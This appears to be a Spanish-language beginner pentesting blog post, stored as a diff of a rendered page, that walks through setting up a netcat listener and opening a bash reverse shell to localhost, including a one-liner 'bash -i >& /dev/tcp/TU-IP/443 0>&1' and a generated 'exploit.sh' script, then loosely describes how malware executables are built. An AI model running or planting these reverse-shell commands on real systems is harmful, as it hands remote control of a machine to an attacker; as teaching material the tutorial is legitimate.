@@ -1,0 +1,144 @@
+I"#<h2> TE AMO LU ME AMAS?</h2>
+
+<p><strong>Hola</strong> hoy estaermos hablando de pentesting web, hablaremos sobre:</p>
+<ul>
+  <li><strong>Creacion de ReverseShell comandos</strong></li>
+  <li><strong>Como estan compuestos los payloads exploits malware para windows.</strong>
+<br /></li>
+</ul>
+
+<p>Vale primero que es una <strong>ReverseShell</strong>, lo explicara en un lenguaje brusco, una ReverShell es aquella que te permite
+ejecutar comandos en una pc que no es tu dominio, es decir una ip el cual es la de la victima conectada a un hosts,
+donde el hosts es tu equipo y te permite ejecucion remota de comandos.</p>
+
+<p><a href="https://www.google.com/search?q=ReverseShell&amp;client=firefox-b-d&amp;sxsrf=ALiCzsbKFcBidTADzj_JE7x-ksfIvwVUpA%3A1658946186694&amp;ei=ioLhYpz9KeezqtsPnd-L8A0&amp;ved=0ahUKEwic6qKR2Jn5AhXnmWoFHZ3vAt4Q4dUDCA0&amp;uact=5&amp;oq=ReverseShell&amp;gs_lcp=Cgdnd3Mtd2l6EAMyBwgjELECECcyBwgjELECECcyBwgjELECECcyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEM6BwgAEEcQsAM6BAguECc6BAgjECc6CwgAEIAEELEDEIMBOgcIIxDqAhAnOggIABCxAxCDAToFCAAQgAQ6BAgAEAM6BggjECcQEzoKCAAQsQMQgwEQQzoKCC4QsQMQgwEQQzoGCAAQChBDOggIABCABBCxAzoICC4QgAQQsQM6BwgAEIAEEAo6BwgAEAoQywE6BQgAEMsBSgQIQRgASgQIRhgAUM4EWPkxYJkzaAhwAXgBgAHzAYgBrBqSAQYwLjE0LjSYAQCgAQGwAQrIAQjAAQE&amp;sclient=gws-wiz">Puedes encontrar mas informacion aqui</a>.</p>
+
+<hr />
+<p><br /></p>
+
+<h3>Empezaremos con las pruebas de ReverseShell:</h3>
+<p>los programas a utilizar para la ReverseShell es bash, netcat, si usas linux es probable que ya tengas los tengas instalados, 
+en el caso contrario ejecuta:
+<br /></p>
+
+<p>para linux:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo apt-get install netcat bash</code></p>
+
+<p>para arch-linux:</p>
+
+<p><code class="language-plaintext highlighter-rouge">pacman -Sy netcat bash</code></p>
+
+<p><br />
+<br /></p>
+
+<h3>IMPORTANTE</h3>
+<ph><font color="green">[*]</font> Para estas bruebas si lo vas a hacer desde terminal, tienes que utilizar bash y no zsh por que te dara
+errores, claro si quieres puedes probar de zsh y conocer los errores pero si quieres omitir esto, entonces solo ejecutas
+el siguiente comando:</ph>
+
+<p><code class="language-plaintext highlighter-rouge">bash</code></p>
+
+<p><img src="screenshots/screen_bash.jpg" /></p>
+
+<ph><font color="lime">[↑]</font> Como puede ver ya no estoy en la zsh entonces vamos a operar desde la terminal y luego operaremos de un script mailicioso.</ph>
+<p><br /></p>
+
+<hr />
+<p><br /></p>
+<ph><font color="lime">[*]</font> Empezamos poniendonos en escucha por el puerto 443 de netcat : </ph>
+
+<p><code class="language-plaintext highlighter-rouge">nc -nvlp 443</code></p>
+
+<ph><font color="lime">[*]</font> Miramos que ip tenemos con el comando ifconfig :</ph>
+
+<p><code class="language-plaintext highlighter-rouge">ifconfig</code></p>
+
+<p><img src="screenshots/ifconfig.jpg" /></p>
+
+<ph><font color="lime">[↑]</font> Como pueden ver tengo la ip 127.0.0.1</ph>
+<p><br /></p>
+<ph><font color="lime">[*]</font> Ahora estando en escucha con netcat "nc -nlvp 443" en el puerto 443, vamos a entablarnos la coneccion desde otra
+terminal por que la primera esta siendo ocupada por netcat entonces recuerden ejecutar el comando `bash` antes de entablar
+la coneccion.</ph>
+
+<p><br /></p>
+
+<ph><font color="lime">[*]</font> Para entablar la coneccion hacemos el siguiente comando :</ph>
+<p><br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">bash  	   # IMPORTANTE ES LA TERMINAL BASH NO LA ZSH</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/TU-IP/443/ 0&gt;&amp;1</code></p>
+
+<p><img src="screenshots/reverse.jpg" /></p>
+
+<ph><font color="lime">[↑]</font> Como pueden ver se me abrio un <b>ReverseShell</b> en la parte donde estaba en escucha con netcat.</ph>
+
+<hr />
+<p><br /></p>
+
+<ph><font color="lime">[*]</font> Ahora pasaremos a desarrollar un **script malicioso en bash**, para ello aremos los mismo solo que esta ves el comando : 
+`bash -i &gt;&amp; /dev/tcp/127.0.0.1/443 0&gt;&amp;1` ira dentro de un script sh para ello:</ph>
+
+<p><br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>touch exploit.sh &amp;&amp; echo -e "bash -i &amp;&gt;/dev/tcp/$(cat /etc/hosts  | grep localhost | awk "NR==1" | cut -d " " -f "1-1")/443 0&gt;&amp;1" &gt;&gt; exploit.sh &amp;&amp; chmod +x ./exploit.sh
+</code></pre></div></div>
+
+<p><br /></p>
+
+<ph><font color="lime">[*]</font> Lo que desarrolle con ese comando fue hacer un script en bash para poder entablarme una coneccion pueden hacer `ls` y veran un
+archivo llamado **exploit.sh** y de paso otorgarle permiso de ejecucion.</ph>
+
+<p>No se ofusque si no entiende la anterior  linea de codigo simplemente lo que hace es hacer un archivo con <code class="language-plaintext highlighter-rouge">touch</code> darle permisos
+con de ejecucion <code class="language-plaintext highlighter-rouge">chmod +x exploit.sh</code> y meterle adentro con <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> el codigo :</p>
+
+<pre><code class="language-#!/bin/bash">   bash -i &gt;&amp; /dev/tcp/127.0.0.1 0&gt;&amp;1
+</code></pre>
+<p><br /></p>
+<ph><font color="lime">[*]</font> Pueden hacerlo manualmente con los siquientes comandos :</ph>
+
+<p><code class="language-plaintext highlighter-rouge">touch exploit.sh</code>
+<code class="language-plaintext highlighter-rouge">chmod +x exploit.sh</code>
+Abren el archivo creado y colocan la <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/SU-IP/443 0&gt;&amp;1</code></p>
+
+<p><br /></p>
+
+<ph><font color="lime">[*]</font> Una vez ya echo el archivo, pongace en escucha por el puerto 443 con netcat. Recuerde
+que con el comando <b>nc -nlvp 443</b> nos poniamos en escucha por el puerto 443 este puerto puede ser modificado siempre
+y cuando el puerto no este en uso y claramente en el exploit o codigo ponga su respectivo puerto.ﾠ</ph>
+
+<p>ﾠ</p>
+<ph><font color="lime">[*]</font> Nos ponemos en escucha con netcat</ph>
+<p><code class="language-plaintext highlighter-rouge">nc -nlvp 443</code></p>
+
+<ph><font color="lime">[*]</font> Y ejecutamos el archivo creado</ph>
+<p><code class="language-plaintext highlighter-rouge">./exploit.sh</code></p>
+
+<p><img src="screenshots/final.jpg" /></p>
+
+<ph><font color="lime">[*]</font><b> Ahora como puden ver tengo una reverse shell</b></ph>
+
+<p><br /></p>
+
+<ph><font color="lime">[*]</font> Lo mas comodo de hacerlo por script es que se puden ejecutar el archivo teniendo la zsh y ahorrandose el comando `bash` y
+ejecutar el archivo este se debe a la extension "sh" que tiene el archivo.</ph>
+<p><br /></p>
+<ph>Vale ya sabes al menos cosas basicas de como entablarte un reverse shell luego voy a hacer que entiendas como
+ganar acceso a un sistema.<b>http,https.</b></ph>
+
+<hr />
+
+<h3>Como estan desarollados los backdoor, exploits, payloads y malware?</h3>
+<ph>Te lo voy a explicar en un lenguaje brusco es decir a mi manera para que puedas entenderlo mas facil.<ph>
+<ph>Un archivo malicioso ya puede ser malware exploit backdoor (Puerta tracera) payloads, no son mas que archivos en
+binario que si recuerdas es lenguaje de la computadora que usa para poder operar. estos archivos puden ser
+tambien escritos en hexadecimal para poder luego con un compilador pasarlo a binario.
+para esto existen compiladores que te ayudan a crear este tipo de archivo el ultimo
+exe que hice fue un archivo escrito en <b>C</b> ganabas acceso al sistema con solo abrirlo, pero este no es el caso de hablar de esto.
+si quieres aprender a desarrollar un .exe debes aprender lenguaje c y con ayuda de una herramienta poder compilarlos
+yo utilizaba code block.</ph>
+
+</ph></ph>
+:ET
